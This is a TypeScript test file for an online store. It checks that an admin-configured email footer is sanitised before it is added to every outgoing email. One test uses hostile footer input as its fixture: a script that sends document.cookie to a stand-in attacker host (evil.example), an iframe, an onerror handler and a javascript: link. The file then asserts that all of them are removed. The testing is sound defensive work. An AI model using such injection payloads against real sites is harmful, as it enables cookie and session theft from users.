/**
 * emailFooterSanitize.test.ts — System audit (Oct 2026).
 * Admin → Settings → Email → "Email Footer Text" is appended to EVERY outgoing e-mail. It was injected as raw HTML, so markup
 * typed (or pasted, or injected by a compromised admin session) into that one setting reached every customer's inbox. It now
 * goes through the same allow-list sanitiser as the announcement bar. Plain text and simple links must still work.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest'

const mockSend = vi.fn()
vi.mock('resend', () => ({ Resend: vi.fn().mockImplementation(function () { return { emails: { send: mockSend } } }) }))
vi.mock('@/lib/supabase', () => ({ getServiceClient: () => ({ from: () => ({ insert: () => Promise.resolve({ error: null }) }) }) }))
let footer = ''
vi.mock('@/lib/getSiteSettings', () => ({ getSiteSettings: vi.fn(async () => ({ email_footer_text: footer })) }))

const { sendTransactionalEmail } = await import('@/lib/server/email')
const sentHtml = () => (mockSend.mock.calls.at(-1)![0] as { html: string }).html

describe('email footer text is sanitised before it is appended', () => {
  beforeEach(() => { mockSend.mockReset(); mockSend.mockResolvedValue({ data: { id: 'x' }, error: null }) })
  const send = () => sendTransactionalEmail({ type: 'order_confirmation', to: 'c@example.com', subject: 's', html: '<p>Body</p>' })

  it('script, iframe, inline handlers and javascript: links are removed', async () => {
    footer = '© 2026 Pahadi Roots <script>fetch("//evil.example?c="+document.cookie)</script><iframe src="//evil.example"></iframe><img src=x onerror=alert(1)> <a href="javascript:alert(1)">click</a>'
    await send()
    const html = sentHtml()
    expect(html).toContain('<p>Body</p>')
    expect(html).toContain('© 2026 Pahadi Roots')
    expect(html).not.toMatch(/<script|<iframe|onerror|javascript:|evil\.example/i)
  })
  it('plain text and a normal https link survive', async () => {
    footer = 'Pahadi Roots · Kangra, Himachal Pradesh · <a href="https://www.pahadiroots.com">pahadiroots.com</a>'
    await send()
    expect(sentHtml()).toContain('Kangra, Himachal Pradesh')
    expect(sentHtml()).toContain('href="https://www.pahadiroots.com"')
  })
  it('no footer configured → the e-mail body is unchanged', async () => {
    footer = ''
    await send()
    expect(sentHtml()).toBe('<p>Body</p>')
  })
})
